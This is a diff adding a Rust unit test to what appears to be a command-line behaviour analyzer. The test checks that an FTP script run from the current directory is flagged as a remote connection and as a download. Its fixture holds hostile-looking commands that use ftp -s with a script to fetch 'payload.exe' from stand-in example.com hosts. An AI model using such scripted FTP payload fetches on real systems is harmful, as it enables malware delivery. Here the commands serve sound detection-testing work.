@@ -15495,6 +15495,48 @@ ftp -n -s:ftp.txt"#,
     }
 
     #[test]
+    fn ftp_current_dir_script_file_emits_remote_connect_and_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "ftp.txt".to_string(),
+            crate::env::FsEntry::Content {
+                content: b"open ftp-current-dir.example.com\r\nget payload.exe out.exe\r\n"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        crate::interp::interpret_line(r"ftp -n -s:.\ftp.txt", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::RemoteConnect { cmd, host, port }
+                        if cmd == r"ftp -n -s:.\ftp.txt"
+                            && host == "ftp-current-dir.example.com"
+                            && *port == 21
+                )
+            }),
+            "current-dir ftp script remote host was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst }
+                        if cmd == r"ftp -n -s:.\ftp.txt"
+                            && src == "ftp://ftp-current-dir.example.com/payload.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "current-dir ftp script get command was not surfaced as download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn ftp_script_cd_and_default_get_destination_are_resolved() {
         let report = analyze(
             br#"echo open ftp-dir.example.net 2121 >f.scr
